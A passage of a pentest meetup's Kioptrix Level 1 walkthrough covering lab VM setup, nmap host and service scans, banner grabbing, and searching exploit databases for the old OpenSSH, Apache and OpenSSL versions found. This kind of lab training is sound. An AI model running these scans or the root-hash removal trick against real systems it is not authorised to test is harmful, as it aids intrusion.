

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.14. Kioptrix Level 1 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.15. Security Shepherd Web App Levels" href="security_shepherd.html" />
    <link rel="prev" title="3.13. Kioptrix Level 2" href="kioptrix2.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.14. Kioptrix Level 1</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.14.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.14.1.1. Setting up the VMware VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.14.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#directory-setup">3.14.2.1. Directory setup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id21">3.14.2.2. Reconnaisance</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploits">3.14.3. The Exploits</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id23">3.14.3.1. Samba &lt;= 2.2.8 - Remote Root Exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id25">3.14.3.2. Samba trans2open Overflow (Linux x86)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id26">3.14.3.3. Apache OpenSSL - Remote Exploit</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.14. Kioptrix Level 1</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/kioptrix1.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="kioptrix-level-1">
<span id="kioptrix1"></span><h1>3.14. Kioptrix Level 1<a class="headerlink" href="#kioptrix-level-1" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.14.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulnhub Kioptrix: Level 1 (#1)</a>, the first of the <a class="reference external" href="https://www.vulnhub.com/series/kioptrix,8/">Vulnhub Kioptrix Series</a>.</p>
<blockquote>
<div>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</div></blockquote>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.14.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar">Kioptrix_Level_1.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to Kioptrix1 via root.</p>
<p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Kioptrix1 runs Red Hat Linux 7.2 (Enigma) with i686 kernel 2.4.7-10. Here’s how you can create a backing store to undo any changes to the disk:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>kioptrix1
curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
<span class="nv">$SUDO</span> apt-get install unrar -y
<span class="nv">$SUDO</span> unrar e Kioptrix_Level_1.rar
<span class="nv">BACKING</span><span class="o">=</span><span class="s2">&quot;Kioptix Level 1.vmdk&quot;</span>
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$BACKING</span><span class="s2">&quot;</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># BACKING=&quot;Kioptix Level 1.vmdk&quot;</span>
<span class="c1"># VM_DISK=$VM-changes.qcow2</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the kioptrix1 VM. The actual command the author used in Debian Linux to create the VM was:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>kioptrix1
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --network<span class="o">=</span><span class="s2">&quot;bridge=br0,model=ne2k_pci&quot;</span> <span class="se">\</span>
    --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>generic24 <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>During the boot you’ll have to utilize kudzu hardware configuration: “Remove Configuration” for the PCnet LANCE and “Configure” the added RTL-8029(AS) NIC by migrating the existing network configuration. You can “Ignore” the rest of the added devices.</p>
<p>If kioptrix were running and you wanted to “start over again”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">VM</span><span class="o">=</span>kioptrix1
<span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">BACKING</span><span class="o">=</span><span class="s2">&quot;Kioptix Level 1.vmdk&quot;</span>
<span class="nv">VM_DISK</span><span class="o">=</span><span class="nv">$VM</span>-changes.qcow2
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$BACKING</span><span class="s2">&quot;</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virsh start <span class="nv">$VM</span>
<span class="c1"># Rerun kudzu to configure the hardware</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.14.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="directory-setup">
<h3>3.14.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
<p>We’ll refer to the following directories below:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
<span class="nv">PT</span><span class="o">=</span><span class="nv">$BASE</span>/kioptrix1
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id21">
<h3>3.14.2.2. Reconnaisance<a class="headerlink" href="#id21" title="Permalink to this headline">¶</a></h3>
<div class="section" id="network-reconnaissance">
<h4>3.14.2.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h4>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap
<span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="nv">$SUDO</span> nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1$ cd $</span>PT/nmap
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$</span> <span class="nv">NMOUT</span><span class="o">=</span>nmap
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$</span> <span class="nv">SN</span><span class="o">=</span><span class="s1">&#39;192.168.1.0/24&#39;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$</span> <span class="nv">TARGETS</span><span class="o">=</span>targets.txt
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO nmap -sn -PE -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn <span class="nv">$SN</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Nmap scan report for 192.168.1.102</span>
</span><span class="hll"><span class="go">Host is up (-0.086s latency).</span>
</span><span class="hll"><span class="go">MAC Address: 52:54:00:14:FD:26 (QEMU Virtual NIC)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.*
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ #</span> use the grep-able output to get a list of target hosts
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$</span> grep Up <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ #</span> use the xml output to get an html report
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_sn.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_sn.html
</pre></div>
</div>
<p>At this point we have $TARGETS so scan them:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Discovered open port 22/tcp on 192.168.1.102</span>
</span><span class="hll"><span class="go">Discovered open port 443/tcp on 192.168.1.102</span>
</span><span class="hll"><span class="go">Discovered open port 139/tcp on 192.168.1.102</span>
</span><span class="hll"><span class="go">Discovered open port 111/tcp on 192.168.1.102</span>
</span><span class="hll"><span class="go">Discovered open port 80/tcp on 192.168.1.102</span>
</span><span class="hll"><span class="go">Discovered open port 32768/tcp on 192.168.1.102</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">PORT      STATE SERVICE     VERSION</span>
</span><span class="hll"><span class="go">22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span>
</span><span class="hll"><span class="go">111/tcp   open  rpcbind     2 (RPC #100000)</span>
</span><span class="hll"><span class="go">| rpcinfo:</span>
</span><span class="hll"><span class="go">|   program version   port/proto  service</span>
</span><span class="hll"><span class="go">|   100000  2            111/tcp  rpcbind</span>
</span><span class="hll"><span class="go">|   100000  2            111/udp  rpcbind</span>
</span><span class="hll"><span class="go">|   100024  1          32768/tcp  status</span>
</span><span class="hll"><span class="go">|_  100024  1          32768/udp  status</span>
</span><span class="hll"><span class="go">139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span>
</span><span class="hll"><span class="go">443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">32768/tcp open  status      1 (RPC #100024)</span>
</span><span class="hll"><span class="go">MAC Address: 52:54:00:14:FD:26 (QEMU Virtual NIC)</span>
</span><span class="hll"><span class="go">Device type: general purpose</span>
</span><span class="hll"><span class="go">Running: Linux 2.4.X</span>
</span><span class="hll"><span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.4</span>
</span><span class="hll"><span class="go">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Host script results:</span>
</span><span class="hll"><span class="go">| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span>
</span><span class="hll"><span class="go">| Names:</span>
</span><span class="hll"><span class="go">|   KIOPTRIX&lt;00&gt;         Flags: &lt;unique&gt;&lt;active&gt;</span>
</span><span class="hll"><span class="go">|   KIOPTRIX&lt;03&gt;         Flags: &lt;unique&gt;&lt;active&gt;</span>
</span><span class="hll"><span class="go">|   KIOPTRIX&lt;20&gt;         Flags: &lt;unique&gt;&lt;active&gt;</span>
</span><span class="hll"><span class="go">|   MYGROUP&lt;00&gt;          Flags: &lt;group&gt;&lt;active&gt;</span>
</span><span class="hll"><span class="go">|   MYGROUP&lt;1e&gt;          Flags: &lt;group&gt;&lt;active&gt;</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
<span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ xsltproc $</span><span class="o">{</span>NMOUT<span class="o">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
</pre></div>
</div>
</div>
<div class="section" id="exposed-services">
<h4>3.14.2.2.2. Exposed services<a class="headerlink" href="#exposed-services" title="Permalink to this headline">¶</a></h4>
<p>Our target kioptrix1 is T=192.168.1.102 and runs:</p>
<div class="section" id="port-22-openssh-2-9p2-protocol-1-99">
<h5>3.14.2.2.2.1. port 22: OpenSSH 2.9p2 (protocol 1.99)<a class="headerlink" href="#port-22-openssh-2-9p2-protocol-1-99" title="Permalink to this headline">¶</a></h5>
<p>Look for actual exploits in <a class="reference external" href="https://www.exploit-db.com/search/">Search Exploit Database</a> with <a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=openssh&amp;e_author=&amp;platform=16&amp;type=3">advanced search specifying openssh, linux platform, remote exploits</a>. There were 6 hits of which only <a class="reference external" href="https://www.exploit-db.com/exploits/387/">Dropbear SSH &lt;= 0.34 - Remote Root Exploit</a> looked promising but requires a hacked ssh client. That may be a bit too much work if something easier is available. Running <code class="docutils literal notranslate"><span class="pre">searchsploit</span> <span class="pre">openssh</span></code> generated simliar results to the Exploit Database search.</p>
<p><a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-6040/Openbsd-Openssh-2.9p2.html">CVE Details Openbsd Openssh 2.9p2 Security Vulnerabilities</a> lists these possible serious exploits: <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2006-5051/">CVE-2006-5051</a> (if GSSAPI authentication is enabled), <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0640/">CVE-2002-0640</a> (if using PAM modules with interactive keyboard  authentication (PAMAuthenticationViaKbdInt)), <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0639/">CVE-2002-0639</a> (when OpenSSH is using SKEY or BSD_AUTH authentication), and <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0083/">CVE-2002-0083</a> (local users or remote malicious servers can gain privileges). Of these, <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0083/">CVS-2002-0083</a> looks most promising, but requires valid credentials. A proof-of-concept is available via <a class="reference external" href="http://www.securityfocus.com/data/vulnerabilities/exploits/osshchan.tgz">/data/vulnerbilites/exploit/osschan.tgz</a>.</p>
<p>No easy exploits surfaced.</p>
</div>
<div class="section" id="ports-80-443-apache-httpd-1-3-20-on-redhat-linux-7-2">
<h5>3.14.2.2.2.2. ports 80, 443: Apache httpd 1.3.20 on RedHat Linux 7.2<a class="headerlink" href="#ports-80-443-apache-httpd-1-3-20-on-redhat-linux-7-2" title="Permalink to this headline">¶</a></h5>
<p>kioptrix1 runs Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b), easily onfirmed this with a simple <code class="docutils literal notranslate"><span class="pre">socat</span></code> run:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nb">echo</span> <span class="s2">&quot;HEAD / HTTP1.1&quot;</span> <span class="p">|</span> socat - tcp:<span class="nv">$T</span>:80
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>Apache 1.3.20 points to the very old RedHat Linux 7.2 which released with the 2.4.7 Linux kernel. <a class="reference external" href="https://rhn.redhat.com/errata/rh72-errata.html">Red Hat Linux 7.2 General Advisories</a> shows the announced RedHat Linux 7.2 vulnerabilities.</p>
<p>Look for actual exploits in <a class="reference external" href="https://www.exploit-db.com/search/">Search Exploit Database</a> using openssl, mod_ssl, and apache. Using the advanced search to restrict exploits to “remote” exploits on the “linux” platform reduces the number of hits: mod_ssl gets 0, “apache httpd” only gets 2 unrelated hits, while <a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=openssl&amp;e_author=&amp;platform=16&amp;type=3">openssl search</a> returns 11 of which only <a class="reference external" href="https://www.exploit-db.com/exploits/764/">Apache OpenSSL - Remote Exploit</a> looks promising; later we’ll see it allows remotely getting root.</p>
<p>Just looking at CVE’s generates too many that may not have published exploits: <a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-5146/Apache-Http-Server-1.3.20.html">CVE Details Apache Https Server 1.3.20</a> identifies 37 possible Apache exploits; <a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-1046/product_id-1817/version_id-6036/">CVE Details Mod Ssl 2.8.4</a> shows 2; and <a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-217/product_id-383/version_id-7312/Openssl-Openssl-0.9.6b.html">CVE Details Openssl 0.9.6b</a> shows 37 exploits.</p>
</div>
<div class="section" id="ports-111-32768-rpcbind-statd">
<h5>3.14.2.2.2.3. ports 111, 32768: rpcbind, statd<a class="headerlink" href="#ports-111-32768-rpcbind-statd" title="Permalink to this headline">¶</a></h5>
<p>Run <code class="docutils literal notranslate"><span class="pre">rpcinfo</span> <span class="pre">-p</span> <span class="pre">$T</span></code> to scan port 111:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
<span class="hll"><span class="gp">hacker@kali:~$</span> rpcinfo -p <span class="nv">$T</span>
